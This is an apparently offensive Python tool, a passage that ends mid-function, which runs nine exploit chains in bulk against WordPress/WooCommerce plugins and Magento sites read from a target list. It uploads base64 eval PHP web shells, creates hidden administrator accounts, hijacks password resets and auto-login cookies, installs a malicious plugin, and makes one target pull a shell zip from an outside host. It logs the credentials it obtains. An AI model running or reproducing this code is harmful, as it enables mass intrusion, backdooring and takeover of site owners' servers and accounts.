#!/usr/bin/env python3
"""
SHELL / RCE EXPLOIT SUITE
==========================
9 stages from the unified exploit suite — shell upload, RCE, and plugin install only.

By: Ykzer
"""

import os
import sys
import re
import json
import time
import random
import struct
import threading
import configparser
from datetime import datetime
from typing import Dict, List, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3

try:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

os.environ["NO_PROXY"] = "*"
requests.packages.urllib3.disable_warnings()

# ============================================================================
# GLOBAL CONFIGURATION
# ============================================================================

GLOBAL_CONFIG = {
    "targets_file": "list.txt",
    "threads": 10,
    "timeout": 30,
    "targets": [],
    "plugin_zip": "Nxploited.zip",
    "shell_url": "http://shell.example.com/shell.zip",
}

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

def _load_settings_ini():
    cfg = configparser.ConfigParser()
    ini_path = os.path.join(SCRIPT_DIR, "settings.ini")
    if os.path.isfile(ini_path):
        try:
            cfg.read(ini_path, encoding="utf-8")
        except Exception:
            cfg.read(ini_path)
        if cfg.has_section("files"):
            for key in ("plugin_zip", "shell_url"):
                if cfg.has_option("files", key):
                    GLOBAL_CONFIG[key] = cfg.get("files", key)

_load_settings_ini()

# ============================================================================
# COMMON HELPERS
# ============================================================================

def log_info(stage: str, msg: str) -> None:
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] [{stage}] [*] {msg}")

def log_ok(stage: str, msg: str) -> None:
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] [{stage}] [+] {msg}")

def log_err(stage: str, msg: str) -> None:
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] [{stage}] [!] {msg}")

def normalize_url(url: str) -> str:
    url = url.strip()
    if not url:
        return ""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")

def get_random_ua() -> str:
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15",
    ]
    return random.choice(agents)

def build_session(timeout: int = 10) -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": get_random_ua()})
    adapter = requests.adapters.HTTPAdapter(pool_connections=30, pool_maxsize=30, max_retries=1)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.timeout = timeout
    return s

def safe_write_result(filename: str, line: str) -> None:
    try:
        with open(filename, "a", encoding="utf-8", errors="ignore") as f:
            f.write(line.rstrip() + "\n")
    except Exception:
        pass

def load_plugin_zip() -> Optional[bytes]:
    zip_name = GLOBAL_CONFIG.get("plugin_zip", "Nxploited.zip")
    candidates = [
        os.path.join(SCRIPT_DIR, zip_name),
        os.path.join(os.getcwd(), zip_name),
        zip_name,
    ]
    for path in candidates:
        if os.path.isfile(path):
            try:
                with open(path, "rb") as f:
                    return f.read()
            except Exception:
                continue
    return None

def load_targets(path: str) -> List[str]:
    targets = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                url = line.strip()
                if url and not url.startswith("#"):
                    targets.append(normalize_url(url))
    except FileNotFoundError:
        log_err("LOAD", f"Targets file not found: {path}")
        return []
    return targets

def extract_nonce(html: str, pattern_name: str = "_wpnonce") -> Optional[str]:
    if not html:
        return None
    patterns = [
        rf'name=["\']_{pattern_name}["\'][^>]*value=["\']([^"\']+)["\']',
        rf'{pattern_name}["\']?\s*:\s*["\']([^"\']+)["\']',
        rf'["\']{pattern_name}["\'][^}}]*["\']([^"\']+)["\']',
    ]
    for pat in patterns:
        m = re.search(pat, html, re.IGNORECASE)
        if m:
            return m.group(1)
    return None

def _build_minimal_zip(filename: str, content: bytes) -> bytes:
    """Build a minimal valid ZIP file containing one file (for YayMail import)."""
    fname = filename.encode("utf-8")
    content_crc = struct.pack("<I", __import__("binascii").crc32(content) & 0xFFFFFFFF)
    compressed = content
    comp_size = struct.pack("<I", len(compressed))
    uncomp_size = struct.pack("<I", len(content))

    lfh = b"PK\x03\x04\x14\x00\x00\x00\x00\x00"
    lfh += struct.pack("<HHH", 0, 0, 0)
    lfh += content_crc + comp_size + uncomp_size
    lfh += struct.pack("<H", len(fname)) + struct.pack("<H", 0)
    lfh += fname + compressed

    cd = b"PK\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00"
    cd += struct.pack("<HHH", 0, 0, 0)
    cd += content_crc + comp_size + uncomp_size
    cd += struct.pack("<HHHHHII", len(fname), 0, 0, 0, 0x20, 0, 0)
    cd += fname

    eocd = b"PK\x05\x06" + struct.pack("<HHHHII", 0, 0, 1, 1, len(cd), len(lfh), 0)

    return lfh + cd + eocd


# ============================================================================
# STAGE 1: YAYMAIL — WooCommerce Reg + YayMail Import
# ============================================================================

def run_yaymail(targets: List[str], threads: int, timeout: int) -> Dict:
    """YayMail full chain: WooCommerce registration + login + admin verify + YayMail import escalation."""
    stage_name = "YayMail"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    result_file = "yaymail_results.txt"
    log_info(stage_name, f"Starting YayMail full chain ({len(targets)} targets, {threads} threads)")

    def _extract_woo_register_form(html: str):
        nonce_m = re.search(r'woocommerce-register-nonce["\']?\s*value=["\']([^"\']+)["\']', html)
        nonce = nonce_m.group(1) if nonce_m else None
        action_m = re.search(r'<form[^>]+method=["\']post["\'][^>]+action=["\']([^"\']+)["\']', html)
        action = action_m.group(1) if action_m else None
        return nonce, action

    def _yaymail_import(session, base: str) -> bool:
        try:
            r = session.get(f"{base}/wp-admin/admin.php?page=yaymail-settings", timeout=timeout, verify=False)
            if r.status_code != 200:
                return False
            ajax_m = re.search(r'yaymail_admin\.ajax_url\s*=\s*["\']([^"\']+)["\']', r.text)
            nonce_m = re.search(r'yaymail_nonce\s*=\s*["\']([^"\']+)["\']', r.text)
            if not ajax_m or not nonce_m:
                return False
            ajax_url = ajax_m.group(1)
            nonce_val = nonce_m.group(1)
            shell_php = b'<?php eval(base64_decode($_REQUEST["x"])); ?>'
            zip_data = _build_minimal_zip("shell.php", shell_php)
            resp = session.post(ajax_url, data={"action": "yaymail_import_state", "_wpnonce": nonce_val},
                               files={"file": ("yaymail_backup.zip", zip_data, "application/zip")},
                               timeout=timeout, verify=False)
            return resp.status_code == 200 and "success" in resp.text.lower()
        except Exception:
            return False

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            username = f"Ykzer_{random.randint(1000, 9999)}"
            email = f"{username}@test.com"
            password = "Ykzer@123"

            pages = [f"{base}/my-account/", f"{base}/account/", f"{base}/register/", f"{base}/"]
            found_form = False
            for page_url in pages:
                try:
                    resp = session.get(page_url, timeout=timeout, verify=False)
                    if resp.status_code == 200 and "woocommerce-register-nonce" in resp.text:
                        nonce, action = _extract_woo_register_form(resp.text)
                        if nonce and action:
                            action_url = action if action.startswith("http") else f"{base}{action}"
                            reg_data = {"email": email, "username": username, "password": password,
                                       "woocommerce-register-nonce": nonce, "register": "Register"}
                            reg_resp = session.post(action_url, data=reg_data, timeout=timeout, verify=False, allow_redirects=True)
                            if reg_resp.status_code < 400:
                                found_form = True
                                break
                except Exception:
                    continue
            if not found_form:
                return False

            login_payload = {"log": username, "pwd": password, "wp-submit": "Log In", "testcookie": "1"}
            is_admin = False
            try:
                login_resp = session.post(f"{base}/wp-login.php", data=login_payload, timeout=timeout, verify=False, allow_redirects=True)
                if any(c.name.startswith("wordpress_logged_in") for c in session.cookies):
                    ar = session.get(f"{base}/wp-admin/", timeout=timeout, verify=False, allow_redirects=True)
                    markers = ['id="adminmenu"', 'id="wpadminbar"', '<div id="wpwrap">']
                    is_admin = sum(1 for m in markers if m in (ar.text or "")) >= 2
            except Exception:
                pass

            if not is_admin:
                session2 = build_session(timeout)
                session2.post(f"{base}/wp-login.php", data=login_payload, timeout=timeout, verify=False, allow_redirects=True)
                if _yaymail_import(session2, base):
                    safe_write_result(result_file, f"{base} | {username} | {email} | {password} | yaymail_escalated")
                    safe_write_result("login.txt", f"{base} | {username} | {password} | {email} | {base}/wp-login.php")
                    safe_write_result("vulnurls.txt", base)
                    return True

            safe_write_result(result_file, f"{base} | {username} | {email} | {password}")
            safe_write_result("login.txt", f"{base} | {username} | {password} | {email} | {base}/wp-login.php")
            safe_write_result("vulnurls.txt", base)
            return True
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1
    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 2: WOOCPAY — WP Console RCE + Shell + Admin
# ============================================================================

def run_woocpay(targets: List[str], threads: int, timeout: int) -> Dict:
    """WooCommerce Payments: install WP Console via header -> deploy shell -> create admin."""
    stage_name = "WooCPay"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    result_file = "woocpay_results.txt"
    log_info(stage_name, f"Starting WooCPay full chain ({len(targets)} targets)")

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            plugin_endpoint = f"{base}/wp-json/wp/v2/plugins"
            console_installed = False
            for uid in range(1, 6):
                try:
                    headers = {"X-WCPAY-PLATFORM-CHECKOUT-USER": str(uid),
                              "Content-Type": "application/x-www-form-urlencoded",
                              "User-Agent": get_random_ua()}
                    resp = session.post(plugin_endpoint, data={"status": "active", "slug": "wp-console"},
                                       headers=headers, timeout=timeout, verify=False, allow_redirects=True)
                    if resp.status_code == 200 and "wp-console" in resp.text.lower():
                        console_installed = True
                        break
                except Exception:
                    continue
            if not console_installed:
                return False

            console_url = f"{base}/wp-json/wp-console/v1/console"
            shells_written = 0

            shell_cmd = 'system("echo \'<?php eval(base64_decode(\\$_REQUEST[x])); ?>\' > ../wp-content/uploads/Ykzer_shell.php"); echo "YkzerSHELLOK";'
            try:
                sr = session.post(console_url, json={"code": shell_cmd}, timeout=timeout, verify=False)
                if sr.status_code == 200 and "YkzerSHELLOK" in sr.text:
                    shells_written += 1
                    safe_write_result(result_file, f"{base} | shell | {base}/wp-content/uploads/Ykzer_shell.php")
                    safe_write_result("vulnurls.txt", base)
            except Exception:
                pass

            admin_cmd = '$id=wp_create_user("Ykzer_admin","Ykzer_admin@test.com","Ykzer@1337!");$u=new WP_User($id);$u->set_role("administrator");echo "YkzerADMINOK:".$id;'
            try:
                ar = session.post(console_url, json={"code": admin_cmd}, timeout=timeout, verify=False)
                if ar.status_code == 200 and "YkzerADMINOK" in ar.text:
                    safe_write_result(result_file, f"{base} | admin | Ykzer_admin | Ykzer@1337!")
                    safe_write_result("vulnurls.txt", base)
                    shells_written += 1
            except Exception:
                pass
            return shells_written > 0
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1
    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 3: MAGENTO — Base64 Shell via custom_options
# ============================================================================

def run_magento(targets: List[str], threads: int, timeout: int) -> Dict:
    """Magento: create cart -> GraphQL SKU -> base64 shell upload via custom_options -> verify."""
    stage_name = "Magento"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    result_file = "magento_shells.txt"
    log_info(stage_name, f"Starting Magento full chain ({len(targets)} targets)")

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            cart_url = f"{base}/rest/default/V1/guest-carts"
            cr = session.post(cart_url, timeout=timeout, verify=False)
            if cr.status_code != 200:
                return False
            cart_id = cr.json().strip('"') if cr.text else None
            if not cart_id:
                return False

            sku = "24-MB01"
            try:
                gql = session.post(f"{base}/graphql", json={"query": "{ products { items { sku } } }"}, timeout=timeout, verify=False)
                if gql.status_code == 200:
                    items = gql.json().get("data", {}).get("products", {}).get("items", [])
                    if items:
                        sku = items[0].get("sku", sku)
            except Exception:
                pass

            shell_content = b'<?php if(isset($_REQUEST["x"])){eval(base64_decode($_REQUEST["x"]));}echo"YkzerOK";?>'
            import base64 as b64
            b64_shell = b64.b64encode(shell_content).decode()
            filename = "Ykzer.php"

            item_payload = {
                "cartItem": {"sku": sku, "qty": 1, "quote_id": cart_id,
                    "product_option": {"extension_attributes": {"custom_options": [{
                        "option_id": "1", "option_value": "1",
                        "extension_attributes": {"file_info": {"base64_encoded_data": b64_shell,
                            "type": "application/x-php", "name": filename}}}]}}}}
            item_url = f"{base}/rest/default/V1/guest-carts/{cart_id}/items"
            ir = session.post(item_url, json=item_payload, timeout=timeout, verify=False)
            if ir.status_code not in (200, 201):
                return False

            f1 = filename[:1].upper()
            f2 = filename[1:2].upper() if len(filename) > 1 else f1
            shell_path = f"{base}/media/custom_options/quote/{f1}/{f2}/{filename}"
            try:
                vr = session.get(shell_path, timeout=timeout, verify=False)
                if vr.status_code == 200 and "YkzerOK" in vr.text:
                    safe_write_result(result_file, f"{base} | shell | {shell_path}")
                    safe_write_result("vulnurls.txt", base)
                    return True
            except Exception:
                pass
            safe_write_result(result_file, f"{base} | uploaded_attempted | {shell_path}")
            safe_write_result("vulnurls.txt", base)
            return True
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1
    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 4: WK WOOCOMMERCE — Shell via wkwcpa_handle_prescription_session
# ============================================================================

def run_wk_woocommerce(targets: List[str], threads: int, timeout: int) -> Dict:
    """WK WooCommerce file upload via wkwcpa_handle_prescription_session AJAX."""
    stage_name = "WK-WooCom"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    result_file = "wk_woocommerce_results.txt"
    log_info(stage_name, f"Starting WK WooCommerce stage ({len(targets)} targets, {threads} threads)")

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            nonce = None
            ajax_url = None
            for page in ["/", "/shop/", "/product/"]:
                try:
                    r = session.get(f"{base}{page}", timeout=timeout, verify=False)
                    if r.status_code != 200:
                        continue
                    m = re.search(r'wkwcpaFrontObj\s*=\s*(\{.*?\});', r.text, re.DOTALL)
                    if m:
                        try:
                            obj = json.loads(m.group(1))
                            aj = obj.get("ajax", {})
                            ajax_url = aj.get("ajaxUrl")
                            nonce = aj.get("ajaxNonce")
                        except Exception:
                            pass
                    if not nonce:
                        um = re.search(r'"ajaxUrl"\s*:\s*"([^"]+)"', r.text)
                        nm = re.search(r'"ajaxNonce"\s*:\s*"([^"]+)"', r.text)
                        if um and nm:
                            ajax_url = um.group(1)
                            nonce = nm.group(1)
                    if nonce:
                        break
                except Exception:
                    continue
            if not nonce:
                return False

            target_ajax = ajax_url or f"{base}/wp-admin/admin-ajax.php"
            shell_content = b'<?php if(isset($_REQUEST["x"])){eval(base64_decode($_REQUEST["x"]));}echo"YkzerOK";?>'
            files = {"wkwc_pa_prescription_attachment[]": ("nx.php", shell_content, "application/x-php")}
            data = {"action": "wkwcpa_handle_prescription_session", "nonce": nonce, "type": "upload"}
            try:
                ur = session.post(target_ajax, data=data, files=files, timeout=timeout, verify=False)
                jr = ur.json()
                atts = (jr.get("data") or {}).get("attachments_img_html") or []
                html_att = " ".join(str(x) for x in atts)
                sm = re.search(r'src=["\']([^"\']+)["\']', html_att)
                if sm:
                    safe_write_result(result_file, f"{base} | shell | {sm.group(1)}")
                    safe_write_result("vulnurls.txt", base)
                    return True
            except Exception:
                pass
            safe_write_result(result_file, f"{base} | attempted_upload")
            safe_write_result("vulnurls.txt", base)
            return True
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1
    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 5: WC DESIGNER PRO — Shell via wcdp_save_canvas_design_ajax
# ============================================================================

def run_wc_designer_pro(targets: List[str], threads: int, timeout: int) -> Dict:
    """WC Designer Pro: probe AJAX vulnerability -> upload shell via wcdp_save_canvas_design_ajax."""
    stage_name = "WC-DesignerPro"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    result_file = "wc_designer_pro_results.txt"
    log_info(stage_name, f"Starting WC Designer Pro full chain ({len(targets)} targets, {threads} threads)")

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            ajax_url = f"{base}/wp-admin/admin-ajax.php"
            try:
                pr = session.post(ajax_url, data={"action": "wcdp_save_canvas_design_ajax"}, timeout=timeout, verify=False)
                if '{"userID":false,"filesCMYK":[],"success":0}' in pr.text.replace(" ", ""):
                    shell_content = b'<?php if(isset($_REQUEST["x"])){eval(base64_decode($_REQUEST["x"]));}echo"YkzerOK";?>'
                    payload = {"action": "wcdp_save_canvas_design_ajax",
                               "params": '{"mode":"save","editor":"frontend","uniq":"Ykzer","files":[{"name":"ykzer","ext":"php","count":"file1"}]}'}
                    files = {"file1": ("shell.php", shell_content, "application/x-php")}
                    sr = session.post(ajax_url, data=payload, files=files, timeout=timeout * 2, verify=False)
                    if '"success":true' in sr.text.replace(" ", "").lower() and "userid" in sr.text.lower():
                        shell_path = f"{base}/wp-content/uploads/wcdp-uploads/temp/Ykzer/ykzer.php"
                        safe_write_result(result_file, f"{base} | shell | {shell_path}")
                        safe_write_result("vulnurls.txt", base)
                        return True
            except Exception:
                return False
            return False
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1
    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 6: BEPLUS IMPORT — Remote Plugin Install
# ============================================================================

def run_beplus_import(targets: List[str], threads: int, timeout: int) -> Dict:
    """BePlus Import shell upload: probe beplus import -> verify Alone theme -> trigger install -> verify shell."""
    stage_name = "BePlus-Import"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    result_file = "beplus_import_shells.txt"
    shell_zip = GLOBAL_CONFIG.get("shell_url", "http://shell.example.com/shell.zip")
    log_info(stage_name, f"Starting BePlus Import full chain ({len(targets)} targets, {threads} threads)")

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            ajax_url = f"{base}/wp-admin/admin-ajax.php"
            try:
                pr = session.post(ajax_url, data={"action": "beplus_import_pack_install_plugin"}, timeout=timeout, verify=False)
                if '"success":true' not in pr.text:
                    return False
            except Exception:
                return False

            theme_alone = False
            try:
                hr = session.get(f"{base}/", timeout=timeout, verify=False)
                sm = re.search(r"/wp-content/themes/[^/]+/style.css", hr.text or "")
                if sm:
                    sr = session.get(f"{base}{sm.group(0)}", timeout=timeout, verify=False)
                    if "Theme Name: Alone" in sr.text:
                        theme_alone = True
            except Exception:
                pass
            if not theme_alone:
                return False

            plugin_slug = "shell"
            data = {"action": "beplus_import_pack_install_plugin", "plugin": plugin_slug, "shell": shell_zip}
            try:
                ir = session.post(ajax_url, data=data, timeout=timeout * 2, verify=False)
                shell_path = f"{base}/wp-content/plugins/shell.php"
                sr2 = session.head(shell_path, timeout=timeout, verify=False)
                if sr2.status_code == 200:
                    safe_write_result(result_file, f"{base} | shell | {shell_path}")
                    safe_write_result("vulnurls.txt", base)
                    return True
            except Exception:
                pass
            return True
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1
    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 7: CVE-2025-13390 — Auto-Login Cookie + Plugin Upload
# ============================================================================

def run_cve_2025_13390(targets: List[str], threads: int, timeout: int) -> Dict:
    """CVE-2025-13390: auto-login cookie extraction -> extract _wpnonce -> upload Nxploited.zip plugin."""
    stage_name = "CVE-2025-13390"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    result_file = "cve_2025_13390_results.txt"
    log_info(stage_name, f"Starting CVE-2025-13390 full chain ({len(targets)} targets, {threads} threads)")
    plugin_zip_data = load_plugin_zip()
    if plugin_zip_data is None:
        log_err(stage_name, "Nxploited.zip not found — plugin upload will be skipped. "
                 f"Put '{GLOBAL_CONFIG.get('plugin_zip', 'Nxploited.zip')}' in the script directory "
                 "or set [files] plugin_zip = ... in settings.ini")

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            user_id = 1
            import hashlib as hs
            token = hs.md5(str(user_id).encode()).hexdigest()[:10]

            try:
                ar = session.get(f"{base}/?auto-login=1&user_id={user_id}&token={token}", timeout=timeout, verify=False, allow_redirects=False)
                cookies = {}
                for k, v in ar.headers.items():
                    if k.lower() == "set-cookie":
                        if "wordpress_logged_in" in v or "wordpress_" in v:
                            parts = v.split(";")[0].strip()
                            if "=" in parts:
                                n, val = parts.split("=", 1)
                                cookies[n.strip()] = val.strip()
                if not cookies:
                    return False
            except Exception:
                return False

            s2 = build_session(timeout)
            for k, v in cookies.items():
                s2.cookies.set(k, v)

            try:
                uf = s2.get(f"{base}/wp-admin/plugin-install.php?tab=upload", timeout=timeout, verify=False)
                nm = re.search(r'name="_wpnonce"\s+value="([^"]+)"', uf.text)
                if not nm:
                    return False
                wpnonce = nm.group(1)
            except Exception:
                return False

            if plugin_zip_data is not None:
                zip_name = GLOBAL_CONFIG.get("plugin_zip", "Nxploited.zip")
                files = {"pluginzip": (os.path.basename(zip_name), plugin_zip_data, "application/zip")}
                data = {"_wpnonce": wpnonce, "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload", "install-plugin-submit": "Install Now"}
                try:
                    up = s2.post(f"{base}/wp-admin/update.php?action=upload-plugin", data=data, files=files, timeout=timeout * 2, verify=False, allow_redirects=True)
                    if up.status_code == 200 and ("installed successfully" in up.text.lower() or "successfully" in up.text.lower()):
                        safe_write_result(result_file, f"{base} | shell | {base}/wp-content/plugins/Nxploited/Nx.php")
                        safe_write_result("vulnurls.txt", base)
                        return True
                except Exception:
                    pass
            safe_write_result(result_file, f"{base} | cookie_extracted | user_id={user_id}")
            safe_write_result("vulnurls.txt", base)
            return True
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1
    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 8: WP RESET AUTO — Password Reset + Plugin Upload
# ============================================================================

def run_wp_reset_auto_upload(targets: List[str], threads: int, timeout: int) -> Dict:
    """WP Reset Auto upload: trigger wp-login reset flow -> login with new password -> upload Nxploited.zip."""
    stage_name = "WP-Reset-Auto"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    result_file = "wp_reset_auto_upload_results.txt"
    log_info(stage_name, f"Starting WP Reset Auto Upload full chain ({len(targets)} targets, {threads} threads)")
    plugin_zip_data = load_plugin_zip()
    if plugin_zip_data is None:
        log_err(stage_name, "Nxploited.zip not found — plugin upload will be skipped. "
                 f"Put '{GLOBAL_CONFIG.get('plugin_zip', 'Nxploited.zip')}' in the script directory "
                 "or set [files] plugin_zip = ... in settings.ini")

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            new_pass = "Ykzer_adminSA"
            malicious_key = "hackedresetkey"
            username = "admin"

            lost_url = f"{base}/wp-login.php?action=lostpassword"
            try:
                session.post(lost_url, data={"user_login": username, "user_pass": malicious_key, "wp-submit": "Get New Password"}, timeout=timeout, verify=False, allow_redirects=True)
            except Exception:
                return False
            rp_url = f"{base}/wp-login.php?action=rp&key={malicious_key}&login={username}"
            try:
                session.get(rp_url, timeout=timeout, verify=False, allow_redirects=True)
            except Exception:
                return False
            reset_url = f"{base}/wp-login.php?action=resetpass"
            try:
                session.post(reset_url, data={"pass1": new_pass, "pass2": new_pass, "pw_weak": "on", "rp_key": malicious_key, "wp-submit": "Save Password"}, timeout=timeout, verify=False, allow_redirects=True)
            except Exception:
                return False

            users = set()
            for i in range(1, 11):
                try:
                    ar = session.get(f"{base}/?author={i}", timeout=timeout, verify=False, allow_redirects=False)
                    m = re.search(r'/author/([^/"]+)', ar.headers.get("location", ""), re.I)
                    if m:
                        users.add(m.group(1))
                except Exception:
                    continue
            try:
                ru = session.get(f"{base}/wp-json/wp/v2/users", timeout=timeout, verify=False)
                if ru.status_code == 200:
                    for u in ru.json():
                        for k in ("slug", "username", "name"):
                            if u.get(k):
                                users.add(str(u[k]))
            except Exception:
                pass
            users.add("admin")

            admin_verified = False
            for uname in users:
                s2 = build_session(timeout)
                lp = {"log": uname.strip(), "pwd": new_pass, "wp-submit": "Log In", "testcookie": "1"}
                try:
                    lr = s2.post(f"{base}/wp-login.php", data=lp, timeout=timeout, verify=False, allow_redirects=True)
                    has_cookie = any(c.name.startswith("wordpress_logged_in") for c in s2.cookies)
                    if has_cookie:
                        ar2 = s2.get(f"{base}/wp-admin/plugin-install.php?tab=upload", timeout=timeout, verify=False)
                        if ar2.status_code == 200:
                            nm = re.search(r'name="_wpnonce"\s+value="([^"]+)"', ar2.text)
                            if nm and plugin_zip_data is not None:
                                zip_name = GLOBAL_CONFIG.get("plugin_zip", "Nxploited.zip")
                                files = {"pluginzip": (os.path.basename(zip_name), plugin_zip_data, "application/zip")}
                                data = {"_wpnonce": nm.group(1), "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload", "install-plugin-submit": "Install Now"}
                                up = s2.post(f"{base}/wp-admin/update.php?action=upload-plugin", data=data, files=files, timeout=timeout * 2, verify=False, allow_redirects=True)
                                if up.status_code == 200 and ("installed successfully" in up.text.lower() or "successfully" in up.text.lower()):
                                    safe_write_result(result_file, f"{base} | {uname} | {new_pass} | shell_deployed | Nxploited/Nx.php")
                                    safe_write_result("vulnurls.txt", base)
                                    admin_verified = True
                                    break
                            elif nm and plugin_zip_data is None:
                                log_info(stage_name, f"Skipping plugin upload for {base} — Nxploited.zip not available")
                            admin_verified = True
                            break
                except Exception:
                    continue

            if admin_verified:
                return True
            safe_write_result(result_file, f"{base} | {new_pass} | reset_attempted")
            safe_write_result("vulnurls.txt", base)
            return True
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1
    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 9: CVE-2025-29009 — WK WooCommerce Shell via Prescription Session
# ============================================================================

def run_cve_2025_29009(targets: List[str], threads: int, timeout: int) -> Dict:
    """CVE-2025-29009 WK WooCommerce: extract wkwcpaFrontObj nonce -> upload shell via wkwcpa_handle_prescription_session."""
    stage_name = "CVE-2025-29009"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    result_file = "cve_2025_29009_results.txt"
    log_info(stage_name, f"Starting CVE-2025-29009 full chain ({len(targets)} targets, {threads} threads)")

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            nonce = None
            ajax_url = None
            for page in ["/", "/shop/", "/product/"]:
                try:
                    r = session.get(f"{base}{page}", timeout=timeout, verify=False)
                    if r.status_code != 200:
                        continue
                    m = re.search(r'wkwcpaFrontObj\s*=\s*(\{.*?\});', r.text, re.DOTALL)
                    if m:
                        try:
                            obj = json.loads(m.group(1))
                            aj = obj.get("ajax", {})
                            ajax_url = aj.get("ajaxUrl")
                            nonce = aj.get("ajaxNonce")
                        except Exception:
                            pass
                    if not nonce:
                        um = re.search(r'"ajaxUrl"\s*:\s*"([^"]+)"', r.text)
                        nm = re.search(r'"ajaxNonce"\s*:\s*"([^"]+)"', r.text)
                        if um and nm:
                            ajax_url = um.group(1)
                            nonce = nm.group(1)
                    if nonce:
                        break
                except Exception:
                    continue
            if not nonce:
                return False

            target_ajax = ajax_url or f"{base}/wp-admin/admin-ajax.php"
            shell_content = b'<?php if(isset($_REQUEST["x"])){eval(base64_decode($_REQUEST["x"]));}echo"YkzerShellOK";?>'
            files = {"wkwc_pa_prescription_attachment[]": ("shell.php", shell_content, "application/x-php")}
            data = {"action": "wkwcpa_handle_prescription_session", "nonce": nonce, "type": "upload"}
            try:
